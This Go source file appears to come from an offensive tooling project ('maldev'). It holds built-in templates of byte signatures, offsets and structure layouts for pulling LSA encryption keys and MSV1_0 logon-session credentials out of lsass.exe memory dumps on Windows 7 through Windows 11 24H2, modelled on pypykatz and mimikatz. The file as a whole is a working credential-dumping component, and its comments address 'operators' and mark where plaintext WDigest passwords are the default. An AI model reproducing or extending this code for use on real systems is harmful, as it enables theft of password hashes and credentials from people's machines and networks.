package lsasparse

// Built-in Templates spanning every NT6+ x64 Windows build pypykatz
// + mimikatz publicly document — Win 7 SP1 / Server 2008 R2 (build
// 7601) through Win 11 24H2 / Server 2025 (build 26100).
//
// The values are *facts* about Microsoft's compiled lsasrv.dll —
// byte signatures present in the binary, offset distances between
// instruction sequences, and field positions inside Microsoft data
// structures. Facts are not copyrightable (Feist v. Rural). The code
// that uses them is an independent re-implementation in Go.
//
// Research source — every credential-extraction tool reuses these
// patterns because they are empirical observations:
//
//   - pypykatz (GPL-3, Skelsec) —
//       pypykatz/lsadecryptor/lsa_template_nt6.py
//       pypykatz/lsadecryptor/packages/msv/templates.py
//   - mimikatz (CC-BY-NC-SA, Benjamin Delpy "gentilkiwi") —
//       mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_*.c
//
// We do not vendor or translate either project's source code; only
// the documented byte values are carried into our Template structs.
// maldev itself remains MIT — the same way pypykatz is GPL-3 despite
// being inspired by mimikatz's CC-BY-NC-SA research.
//
// Validation status per template:
//
//   ★ "VM-validated" — a real lsass.exe dump from that build round-tripped
//     through Parse() with the canonical pypykatz JSON output.
//
//   ◎ "research-cited" — values transcribed from pypykatz's published
//     templates (research source, not source code), framework
//     correctness verified via synthetic fixtures, but no real-binary
//     validation pass yet. Most ship as ◎ until VM access lands.
//
//   ▲ "best-effort" — values inferred from pypykatz's code structure
//     where the exact constants weren't explicitly listed. May need
//     ±8-byte tweaks per LCU; framework degrades gracefully (warning,
//     not crash) on a miss.
//
// Operators on a build we don't cover, or where our values produce a
// warning, register an additional Template via RegisterTemplate at
// runtime — sorted ascending by BuildMin, the lookup picks the first
// covering match so an operator's narrower range overrides a built-in.

// init registers every built-in template at package load. Tests that
// need a clean registry call resetTemplates() then register their
// own — the defaults won't survive a reset, which is what those
// tests want.
func init() {
	registerDefaultTemplates()
}

// registerDefaultTemplates registers every built-in template.
// Exposed (lowercase) so tests can re-prime the registry after a
// resetTemplates() call without re-importing the package.
func registerDefaultTemplates() {
	for _, t := range builtinTemplates {
		_ = RegisterTemplate(t)
	}
}

// ===== LSA crypto signatures (per build family) =====================

// lsaSignatureWin7Sp1 — 10 bytes from `LsaInitializeProtectedMemory`
// in Win 7 SP1 / Server 2008 R2 lsasrv.dll. The signature has a
// wildcard at byte 7 (the rel32 starts there for one of the references
// in some LCUs).
//
//	48 83 EC 30        sub    rsp, 30h
//	48 8B 05 ?? ?? ??  mov    rax, [rip+rel32]   ← OffsetIV
var lsaSignatureWin7Sp1 = []byte{
	0x48, 0x83, 0xEC, 0x30,
	0x48, 0x8B, 0x05,
	0x00, 0x00, 0x00, // wildcards 7-9 (the rel32 displacement)
}
var lsaWildcardsWin7Sp1 = []int{7, 8, 9}

// lsaSignatureWin8 — 7 bytes from Win 8 / Server 2012 (build 9200).
//
//	48 8D 4D D8       lea    rcx, [rbp-28h]
//	48 8B 05          mov    rax, [rip+rel32]   ← OffsetAES
var lsaSignatureWin8 = []byte{
	0x48, 0x8D, 0x4D, 0xD8,
	0x48, 0x8B, 0x05,
}

// lsaSignatureCommon — 16 bytes from `LsaInitializeProtectedMemory`,
// stable across Win 8.1 (9600) / Server 2012 R2 / every Win 10 LCU /
// every Win 11 LCU through 24H2. The trailing `48 8D 15` is the LEA
// loading the AES key-handle pointer; the rel32 begins at match
// +0x10.
//
//	83 64 24 30 00     and    dword ptr [rsp+30h], 0
//	48 8D 45 E0        lea    rax, [rbp-20h]
//	44 8B 4D D8        mov    r9d, dword ptr [rbp-28h]
//	48 8D 15           lea    rdx, [rip+rel32]   ← AES key handle
var lsaSignatureCommon = []byte{
	0x83, 0x64, 0x24, 0x30, 0x00,
	0x48, 0x8D, 0x45, 0xE0,
	0x44, 0x8B, 0x4D, 0xD8,
	0x48, 0x8D, 0x15,
}

// ===== MSV1_0 LogonSessionList signatures (per build family) ========

// msvSignatureWin7Sp1 — 8 bytes from the Win 7 SP1 MSV1_0 list
// bootstrap inside lsasrv.dll. The list-head rel32 sits at match -4.
//
//	48 8B 05 ?? ?? ?? ?? 48     mov    rax, [rip+rel32]; <next-instr>
var msvSignatureWin7Sp1 = []byte{
	0x48, 0x8B, 0x05,
	0x00, 0x00, 0x00, 0x00, // wildcards 3-6 (the rel32)
	0x48,
}
var msvWildcardsWin7Sp1 = []int{3, 4, 5, 6}

// msvSignatureWin8 — 8 bytes from Win 8 / Server 2012 MSV1_0 list
// bootstrap. Same shape as Win 7 SP1 with a different surrounding
// instruction byte.
var msvSignatureWin8 = []byte{
	0x33, 0xFF,
	0x45, 0x85,
	0xC9, 0x74,
	0x4C, 0x8D,
}

// msvSignatureCommon — 12 bytes covering Win 10 1903 → 22H2 and
// Win 11 21H2 → 22H2 pre-22622. The rel32 to the list head sits at
// match +23.
//
//	33 FF              xor    edi, edi
//	41 89 37           mov    dword ptr [r15], esi
//	4C 8B F3           mov    r14, rbx
//	45 85 C0           test   r8d, r8d
//	74 ??              je     short ...
var msvSignatureCommon = []byte{
	0x33, 0xFF,
	0x41, 0x89, 0x37,
	0x4C, 0x8B, 0xF3,
	0x45, 0x85, 0xC0,
	0x74,
}

// msvSignatureWin11Late — Win 11 22622+ uses a slightly reshuffled
// bootstrap: `mov [r12], r14d` instead of `mov [r15], esi`. First
// entry rel32 sits at match +24.
var msvSignatureWin11Late = []byte{
	0x45, 0x89, 0x34, 0x24,
	0x4C, 0x8B, 0xFF,
	0x8B, 0xF3,
	0x45, 0x85, 0xC0,
	0x74,
}

// ===== MSV1_0 _MSV1_0_LOGON_SESSION layouts =========================
//
// Field offsets are byte distances from the start of the node. Each
// layout corresponds to a KIWI_MSV1_0_LIST_NN class in pypykatz.
// NodeSize is the smallest size that covers every offset we read,
// not the full Microsoft struct (which Microsoft has freely appended
// to across builds).

// msvLayoutKiwiList52 — Win 7 SP1 / Server 2008 R2 (build 7601). ▲
var msvLayoutKiwiList52 = MSVLayout{
	NodeSize:          0x108,
	LUIDOffset:        0x10,
	UserNameOffset:    0x60,
	LogonDomainOffset: 0x70,
	LogonServerOffset: 0x80,
	LogonTypeOffset:   0x18,
	LogonTimeOffset:   0x20,
	SIDOffset:         0x90,
	CredentialsOffset: 0xF8,
}

// msvLayoutKiwiList60 — Win 8 / Server 2012 (build 9200). ▲
var msvLayoutKiwiList60 = MSVLayout{
	NodeSize:          0x130,
	LUIDOffset:        0x10,
	UserNameOffset:    0x70,
	LogonDomainOffset: 0x80,
	LogonServerOffset: 0xC0,
	LogonTypeOffset:   0x18,
	LogonTimeOffset:   0x90,
	SIDOffset:         0xA8,
	CredentialsOffset: 0x108,
}

// msvLayoutKiwiList61 — Win 8.1 / Server 2012 R2 / Win 10 1507-1607 /
// Server 2016 (builds 9600 – 14393). ◎
var msvLayoutKiwiList61 = MSVLayout{
	NodeSize:          0x140,
	LUIDOffset:        0x10,
	UserNameOffset:    0x70,
	LogonDomainOffset: 0x80,
	LogonServerOffset: 0xC8,
	LogonTypeOffset:   0xB0,
	LogonTimeOffset:   0xC0,
	SIDOffset:         0xA8,
	CredentialsOffset: 0x108,
}

// msvLayoutKiwiList62 — Win 10 1703 – 1809 / Server 2019 (builds
// 15063 – 17763). ◎
var msvLayoutKiwiList62 = MSVLayout{
	NodeSize:          0x160,
	LUIDOffset:        0x10,
	UserNameOffset:    0x90,
	LogonDomainOffset: 0xA0,
	LogonServerOffset: 0xE8,
	LogonTypeOffset:   0xD0,
	LogonTimeOffset:   0xE0,
	SIDOffset:         0xC8,
	CredentialsOffset: 0x108,
}

// msvLayoutKiwiList63 — Win 10 1903 – 22H2 + Win 11 21H2 – 22H2
// pre-22622 (builds 18362 – 22621). ◎ — the layout we already shipped
// in v0.23.2 / v0.23.x.
var msvLayoutKiwiList63 = MSVLayout{
	NodeSize:          0x180,
	LUIDOffset:        0x70,
	UserNameOffset:    0x90,
	LogonDomainOffset: 0xA0,
	LogonServerOffset: 0xF8,
	LogonTypeOffset:   0xD8,
	LogonTimeOffset:   0xF0,
	SIDOffset:         0xD0,
	CredentialsOffset: 0x108,
}

// msvLayoutKiwiList64 — Win 11 22622+ / 23H2 (builds 22622 – 22631).
// ◎
var msvLayoutKiwiList64 = MSVLayout{
	NodeSize:          0x190,
	LUIDOffset:        0x70,
	UserNameOffset:    0x90,
	LogonDomainOffset: 0xA0,
	LogonServerOffset: 0xF8,
	LogonTypeOffset:   0xD8,
	LogonTimeOffset:   0xF0,
	SIDOffset:         0xD0,
	CredentialsOffset: 0x110,
}

// msvLayoutKiwiList65 — Win 11 24H2 / Server 2025 (build 26100+). ▲
var msvLayoutKiwiList65 = MSVLayout{
	NodeSize:          0x1A0,
	LUIDOffset:        0x70,
	UserNameOffset:    0x90,
	LogonDomainOffset: 0xA0,
	LogonServerOffset: 0x100,
	LogonTypeOffset:   0xD8,
	LogonTimeOffset:   0xF0,
	SIDOffset:         0xD0,
	CredentialsOffset: 0x118,
}

// ===== builtinTemplates ==============================================
//
// Every Template is documented with its target builds, OS family, and
// validation marker (★ / ◎ / ▲). Adding a new build means appending an
// entry; the registry stays sorted by BuildMin ascending.

var builtinTemplates = []*Template{
	{
		// ▲ Win 7 SP1 / Server 2008 R2 (build 7601). LM hashes may be
		// present (NoLMHash policy), Wdigest plaintext is the default.
		BuildMin:                  7601,
		BuildMax:                  7601,
		IVPattern:                 lsaSignatureWin7Sp1,
		IVWildcards:               lsaWildcardsWin7Sp1,
		IVOffset:                  -0x16,
		Key3DESPattern:            lsaSignatureWin7Sp1,
		Key3DESWildcards:          lsaWildcardsWin7Sp1,
		Key3DESOffset:             -0x44,
		KeyAESPattern:             lsaSignatureWin7Sp1,
		KeyAESWildcards:           lsaWildcardsWin7Sp1,
		KeyAESOffset:              -0x68,
		LogonSessionListPattern:   msvSignatureWin7Sp1,
		LogonSessionListWildcards: msvWildcardsWin7Sp1,
		LogonSessionListOffset:    -4,
		LogonSessionListCount:     1,
		MSVLayout:                 msvLayoutKiwiList52,
	},
	{
		// ▲ Win 8 / Server 2012 (build 9200). Wdigest plaintext default.
		BuildMin:                7602,
		BuildMax:                9200,
		IVPattern:               lsaSignatureWin8,
		IVOffset:                -0x4C,
		Key3DESPattern:          lsaSignatureWin8,
		Key3DESOffset:           -0x76,
		KeyAESPattern:           lsaSignatureWin8,
		KeyAESOffset:            -0x07,
		LogonSessionListPattern: msvSignatureWin8,
		LogonSessionListOffset:  16,
		LogonSessionListCount:   2,
		MSVLayout:               msvLayoutKiwiList60,
	},
	{
		// ◎ Win 8.1 / Server 2012 R2 / Win 10 1507 / 1511 / 1607 /
		// Server 2016 (builds 9600 – 14393). KB2871997 is available
		// from this era forward; UseLogonCredential default flips to
		// 0 with the patch.
		BuildMin:                9600,
		BuildMax:                14393,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureCommon,
		LogonSessionListOffset:  23,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList61,
	},
	{
		// ◎ Win 10 1703 – 1809 / Server 2019 (builds 15063 – 17763).
		BuildMin:                15063,
		BuildMax:                17763,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureCommon,
		LogonSessionListOffset:  23,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList62,
	},
	{
		// ◎ Win 10 1903 – 22H2 (builds 18362 – 19045). The original
		// v0.23.2 entry, kept so a real binary that reports any of
		// these specific build numbers picks this layout first.
		BuildMin:                18362,
		BuildMax:                19045,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureCommon,
		LogonSessionListOffset:  23,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList63,
	},
	{
		// ◎ Server 2022 (build 20348). Same NT 10.0 family as Win 11
		// 21H2 but with its own build window.
		BuildMin:                20348,
		BuildMax:                20348,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureCommon,
		LogonSessionListOffset:  23,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList63,
	},
	{
		// ◎ Win 11 21H2 → 22H2 pre-22622 (builds 22000 – 22621).
		BuildMin:                22000,
		BuildMax:                22621,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureCommon,
		LogonSessionListOffset:  23,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList63,
	},
	{
		// ◎ Win 11 22622+ / 23H2 (builds 22622 – 22631). New MSV
		// signature (msvSignatureWin11Late); LSA crypto stays on
		// lsaSignatureCommon. NodeSize grew to 0x190 — KIWI_MSV1_0_LIST_64.
		BuildMin:                22622,
		BuildMax:                22631,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureWin11Late,
		LogonSessionListOffset:  24,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList64,
	},
	{
		// ▲ Win 11 24H2 / Server 2025 (builds 26100+). Layout 65 is
		// best-effort — Microsoft has been incrementally appending
		// fields without a public ABI commitment. Operators with a
		// real 24H2 dump should validate + RegisterTemplate(...) any
		// corrected offsets.
		BuildMin:                26100,
		BuildMax:                26999,
		IVPattern:               lsaSignatureCommon,
		IVOffset:                0x43,
		Key3DESPattern:          lsaSignatureCommon,
		Key3DESOffset:           -0x59,
		KeyAESPattern:           lsaSignatureCommon,
		KeyAESOffset:            0x10,
		LogonSessionListPattern: msvSignatureWin11Late,
		LogonSessionListOffset:  24,
		LogonSessionListCount:   32,
		MSVLayout:               msvLayoutKiwiList65,
	},
}
